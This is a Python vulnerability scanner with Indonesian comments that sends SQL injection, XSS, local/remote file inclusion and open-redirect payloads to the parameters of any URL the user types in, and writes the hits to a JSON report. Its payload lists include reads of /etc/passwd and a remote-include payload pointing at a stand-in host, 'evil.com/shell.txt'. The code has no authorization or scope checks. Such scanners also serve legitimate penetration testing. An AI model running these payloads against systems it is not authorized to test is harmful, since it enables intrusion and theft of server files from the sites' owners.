#!/usr/bin/env python3
# AUTO VULNERABILITY SCANNER - Scan celah keamanan website
import os
import requests
import re
import time
from urllib.parse import urljoin, urlparse
from core.colors import Colors

class VulnScanner:
    def __init__(self):
        self.name = "Auto Vulnerability Scanner"
        self.vulns = []
    
    def check_sqli(self, url, params):
        """SQL Injection Scanner"""
        print(f"{Colors.DIM}[*] Testing SQL Injection...{Colors.END}")
        payloads = [
            "'", "''", "' OR '1'='1", "' OR 1=1--", "1' ORDER BY 1--",
            "' UNION SELECT NULL--", "' AND SLEEP(5)--", "admin'--"
        ]
        
        for param in params:
            for payload in payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    start = time.time()
                    resp = requests.get(test_url, timeout=5)
                    elapsed = time.time() - start
                    
                    # Check SQL errors
                    sql_errors = [
                        "sql syntax", "mysql_fetch", "ora-", "query failed",
                        "unclosed quotation", "microsoft ole db", "sql error",
                        "you have an error in your sql", "warning: mysql"
                    ]
                    
                    for error in sql_errors:
                        if error in resp.text.lower():
                            self.vulns.append({
                                "type": "SQL Injection",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "severity": "High"
                            })
                            print(f"{Colors.RED}[!] SQL Injection detected! {test_url}{Colors.END}")
                            break
                    
                    # Time-based detection
                    if elapsed > 5:
                        self.vulns.append({
                            "type": "SQL Injection (Time-based)",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "severity": "High"
                        })
                        print(f"{Colors.RED}[!] Time-based SQL Injection! {test_url}{Colors.END}")
                        
                except:
                    pass
    
    def check_xss(self, url, params):
        """XSS Scanner"""
        print(f"{Colors.DIM}[*] Testing XSS...{Colors.END}")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<svg onload=alert(1)>",
            "'><script>alert(1)</script>"
        ]
        
        for param in params:
            for payload in payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=5)
                    
                    if payload in resp.text:
                        self.vulns.append({
                            "type": "XSS",
                            "url": test_url,
                            "param": param,
                            "payload": payload[:30],
                            "severity": "Medium"
                        })
                        print(f"{Colors.YELLOW}[!] XSS detected! {test_url}{Colors.END}")
                        
                except:
                    pass
    
    def check_lfi(self, url, params):
        """LFI/RFI Scanner"""
        print(f"{Colors.DIM}[*] Testing LFI/RFI...{Colors.END}")
        payloads = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "/etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/shell.txt"
        ]
        
        indicators = ["root:", "daemon:", "bin:", "<?php", "http://"]
        
        for param in params:
            for payload in payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=5)
                    
                    for ind in indicators:
                        if ind in resp.text.lower():
                            self.vulns.append({
                                "type": "LFI/RFI",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "severity": "High"
                            })
                            print(f"{Colors.RED}[!] LFI/RFI detected! {test_url}{Colors.END}")
                            break
                            
                except:
                    pass
    
    def check_open_redirect(self, url, params):
        """Open Redirect Scanner"""
        print(f"{Colors.DIM}[*] Testing Open Redirect...{Colors.END}")
        payloads = [
            "https://google.com",
            "//google.com",
            "///google.com"
        ]
        
        for param in params:
            for payload in payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=5, allow_redirects=False)
                    
                    if resp.status_code in [301, 302]:
                        location = resp.headers.get('Location', '')
                        if "google.com" in location:
                            self.vulns.append({
                                "type": "Open Redirect",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "severity": "Medium"
                            })
                            print(f"{Colors.YELLOW}[!] Open Redirect detected! {test_url}{Colors.END}")
                            
                except:
                    pass
    
    def scan(self, target_url):
        """Main scan function"""
        print(f"\n{Colors.CYAN}[*] Scanning {target_url}{Colors.END}\n")
        
        # Get parameters
        parsed = urlparse(target_url)
        params = []
        
        if parsed.query:
            for p in parsed.query.split('&'):
                params.append(p.split('=')[0])
        
        if not params:
            print(f"{Colors.YELLOW}[!] No parameters found. Testing with basic payloads...{Colors.END}")
            params = ['id', 'page', 'q', 'search', 'query', 'cat', 'product', 'user']
        
        # Run all checks
        self.check_sqli(target_url, params)
        self.check_xss(target_url, params)
        self.check_lfi(target_url, params)
        self.check_open_redirect(target_url, params)
        
        return self.vulns
    
    def generate_report(self):
        """Generate vulnerability report"""
        if not self.vulns:
            return
        
        print(f"\n{Colors.GREEN}{'='*55}{Colors.END}")
        print(f"{Colors.BOLD}📊 VULNERABILITY REPORT{Colors.END}")
        print(f"{Colors.GREEN}{'='*55}{Colors.END}")
        
        for v in self.vulns:
            severity_color = Colors.RED if v['severity'] == 'High' else Colors.YELLOW
            print(f"\n{severity_color}[{v['type']}] {v['severity']} Severity{Colors.END}")
            print(f"  URL: {v['url']}")
            print(f"  Parameter: {v['param']}")
            print(f"  Payload: {v['payload']}")
    
    def run(self):
        print(f"\n{Colors.CYAN}[*] {self.name}{Colors.END}")
        target = input(f"{Colors.GREEN}Target URL (with parameters) > {Colors.END}")
        
        if not target:
            print(f"{Colors.RED}[!] URL required!{Colors.END}")
            return
        
        if not target.startswith('http'):
            target = 'http://' + target
        
        self.scan(target)
        self.generate_report()
        
        if self.vulns:
            # Save report
            import json
            from datetime import datetime
            filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(self.vulns, f, indent=2)
            print(f"\n{Colors.GREEN}[+] Report saved to {filename}{Colors.END}")
        else:
            print(f"\n{Colors.GREEN}[+] No vulnerabilities found!{Colors.END}")

if __name__ == "__main__":
    scanner = VulnScanner()
    scanner.run()
